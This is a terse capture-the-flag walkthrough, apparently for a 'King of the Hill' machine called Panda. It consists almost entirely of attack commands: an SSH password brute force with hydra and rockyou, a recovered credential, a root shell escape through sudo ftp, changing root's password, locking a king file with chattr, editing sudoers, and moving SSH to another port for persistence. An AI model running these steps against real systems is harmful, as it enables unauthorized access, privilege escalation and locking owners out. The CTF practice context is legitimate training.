# Panda 
## Step 1
1. `hydra -l shifu -P /usr/share/wordlists/rockyou.txt ssh://$IP`
	1. `shifu : batman`
2. type `passwd` and change shifu's passwod.
3. `sudo ftp`
4. `!/bin/sh`
5. type `passwd` and change root's password.
6. `chattr -i /root/king.txt;echo lomarkomar > /root/king.txt;chmod a=r /root/king.txt;chattr +i /root/king.txt`
7.  `vim /etc/sudoers` and delete ftp permissions
8. `echo "Port 1337" >> /etc/ssh/sshd_config;sudo service ssh restart` 
9. `find / -name flag 2>/dev/null`
